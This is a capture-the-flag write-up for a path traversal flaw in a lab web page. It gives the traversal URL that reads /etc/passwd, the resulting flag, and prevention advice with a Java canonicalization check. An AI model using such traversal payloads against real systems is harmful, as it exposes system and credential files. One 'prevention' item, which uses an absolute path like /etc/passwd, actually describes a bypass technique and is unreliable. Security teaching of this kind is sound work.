```bash

VULNERABILITY__
    => URL (http://192.168.8.5/?page= "contents of the specified file") takes a page parameter and returns the contents of the specified file

EXPLOIT__
    => traverse to 
    http://192.168.8.5/?page=../../../../../../../etc/passwd
    then => 
    Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 

ABUSE__
=> attacker may access sensitive information such as the "passwd" file.

PREVENTION__
=>  use an absolute path from the filesystem root, 
such as filename=/etc/passwd, to directly reference a file without using any traversal sequences.

=> The most effective way to prevent file path traversal vulnerabilities is to avoid passing user-supplied input to filesystem APIs altogether. Many application functions that do this can be rewritten to deliver the same behavior in a safer way.

If it is considered unavoidable to pass user-supplied input to filesystem APIs, then two layers of defense should be used together to prevent attacks:

The application should validate the user input before processing it. Ideally, the validation should compare against a whitelist of permitted values. If that isn't possible for the required functionality, then the validation should verify that the input contains only permitted content, such as purely alphanumeric characters.
After validating the supplied input, the application should append the input to the base directory and use a platform filesystem API to canonicalize the path. It should verify that the canonicalized path starts with the expected base directory.
Below is an example of some simple Java code to validate the canonical path of a file based on user input:

File file = new File(BASE_DIRECTORY, userInput);
if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    // process file
}

RESOURCES___
=> https://portswigger.net/web-security/file-path-traversal
=> https://owasp.org/www-community/attacks/Path_Traversal

```